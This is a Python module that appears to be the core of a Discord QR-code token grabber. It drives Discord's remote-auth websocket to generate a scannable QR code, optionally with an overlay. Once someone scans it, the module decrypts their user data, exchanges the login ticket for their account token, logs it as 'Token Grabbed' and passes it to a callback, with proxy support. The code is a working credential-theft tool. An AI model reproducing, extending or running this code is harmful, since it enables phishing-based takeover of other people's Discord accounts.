import json
import threading
import time
import websocket
import logging
from lib.discord_crypto import DiscordCrypto
from lib.discord_ticket import DiscordTicket
from lib.types.user import User
from lib.types.websocket_messages import WebsocketMessages
from lib.utils import Utils

logger = logging.getLogger(__name__)

class DiscordWebsocket:
    def __init__(self, ws_endpoint:str="wss://remote-auth-gateway.discord.gg/?v=2", with_overlay:bool = True, proxies:dict=None, on_qr_code:callable=None, on_user_token:callable = None, on_user_data:callable=None):
        self.user = None
        self.heartbeat_stop = threading.Event()
        self.with_overlay = with_overlay
        self.proxies = proxies
        self.on_qr_code = on_qr_code
        self.on_user_token = on_user_token
        self.on_user_data = on_user_data

        self.ws = websocket.WebSocketApp(ws_endpoint,
                                        on_open=self.on_open,
                                        on_message=self.on_message,
                                        on_error=self.on_error,
                                        on_close=self.on_close,
                                        header={'Origin': 'https://discord.com'})

        self.crypto = DiscordCrypto()
        self.ticket_exchange = DiscordTicket(proxies)

    def _send(self, op, data=None):
        logger.info(f"Sending message with op {op} and data {data}")
        payload = {'op': op}

        if data is not None:
            payload.update(**data)
        logger.info(f"Sending payload: {payload}")

        self.ws.send(json.dumps(payload))
        logger.info("Message sent")

    def _close(self):
        logger.info(f"Closing WebSocket, current state: {self.ws.sock and self.ws.sock.connected}")
        self.heartbeat_stop.set()
        self.ws.close()

    def _heartbeat_loop(self, interval):
        logger.info(f"Starting heartbeat loop with interval {interval}")
        last_heartbeat = time.time()
        while not self.heartbeat_stop.is_set():
            time_passed = time.time() - last_heartbeat
            if time_passed >= interval:
                self._heartbeat()
                last_heartbeat = time.time()
            time.sleep(max(0, interval - time_passed))
        logger.info("Heartbeat loop stopped")

    def _heartbeat(self):
        logger.info("Sending heartbeat")
        try:
            self._send(WebsocketMessages.HEARTBEAT)
            logger.info("Heartbeat sent")
        except Exception as e:
            logger.error(f"Error sending heartbeat: {e}")

    def on_open(self, ws):
        logger.info("Connection opened")

    def on_error(self, ws, error):
        logger.error(error)
        self.ws.close()

    def on_close(self, ws, close_status_code, close_msg):
        if close_status_code or close_msg:
            logger.info(f"Connection closed with status code {close_status_code} and message {close_msg}")
        else:
            logger.info("Connection closed without status code or message")

    def on_message(self, ws, message):
        logger.info(f"Received message: {message}")
        message = json.loads(message)

        op = message.get('op')

        if not op:
            logger.warning("Received message without op")
            return

        if op == WebsocketMessages.HELLO:
            logger.info("Received HELLO message")
            interval = message.get('heartbeat_interval') / 1000
            threading.Thread(target=self._heartbeat_loop, args=(interval,)).start()

            self._send(WebsocketMessages.INIT, {'encoded_public_key': self.crypto.public_key})

        elif op == WebsocketMessages.NONCE_PROOF:
            logger.info("Received NONCE_PROOF message")
            nonce = message.get('encrypted_nonce')
            proof = self.crypto.get_proof(nonce)

            self._send(WebsocketMessages.NONCE_PROOF, {'proof': proof})

        elif op == WebsocketMessages.PENDING_REMOTE_INIT:
            logger.info("Received PENDING_REMOTE_INIT message")
            fingerprint = message.get('fingerprint')
            qr_code = Utils.generate_qr_code_with_overlay(fingerprint) if self.with_overlay else Utils.generate_qr_code(fingerprint)
            if self.on_qr_code:
                self.on_qr_code(qr_code)

        elif op == WebsocketMessages.PENDING_TICKET:
            logger.info("Received PENDING_TICKET message")
            encrypted_payload = message.get('encrypted_user_payload')
            user_data = self.crypto.decrypt_payloads(encrypted_payload)
            self.user = User.from_payload(user_data)
            if self.on_user_data:
                self.on_user_data(self.user)

        elif op == WebsocketMessages.PENDING_LOGIN:
            logger.info("Received PENDING_LOGIN message")
            ticket = message.get('ticket')

            token = self.ticket_exchange.exchange_ticket(ticket)
            if token is None:
                logger.error("Error exchanging ticket")
                self._close()
            token = self.crypto.decrypt_payloads(token)
            self.user.token = token
            logger.info(f"Token Grabbed: {token}")

            if self.on_user_token:
                self.on_user_token(token, self.user)

            self._close()

    def run(self):
        if self.proxies:
            self.ws.run_forever(http_proxy_host=self.proxies.get('http'), http_proxy_port=self.proxies.get('port'))
        else:
            self.ws.run_forever()
